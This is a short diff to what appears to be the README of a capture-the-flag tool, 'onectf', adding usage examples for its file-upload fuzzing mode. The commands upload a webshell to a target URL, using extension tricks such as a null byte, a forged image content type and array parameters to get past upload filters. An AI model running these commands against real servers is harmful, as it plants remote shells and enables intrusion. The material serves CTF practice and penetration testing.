@@ -69,4 +69,7 @@ $ onectf uffuf -u <IP:port>/upload.php -p uploadFile -w web-extensions.txt -F we
 $ onectf uffuf -u URL -p file -F webshell.php -Fn dummyFUZZ -v -W .php.png
 $ onectf uffuf -u URL -p file -F webshell.php -Fn dummyFUZZ -v -W .php -Ft 'image/jpeg' -H 'Cookie: PHPSESSID=xxx'
 $ onectf uffuf -u URL -p file -F webshell.php -Fn dummyFUZZ -v -W '.php%00.jpg' -Ft 'image/jpeg'
+$ onectf uffuf -u URL -p file -F webshell.zip -Fn dummyFUZZ -v -W .zip
+$ onectf uffuf -u URL -d 'xxx=yyy' -p file -F webshell.zip -Fn dummyFUZZ -v -W .jpg
+$ onectf uffuf -u URL -p 'file[]' -F webshell.jpg -Fn dummyFUZZ -v -W x.jpg
 ```
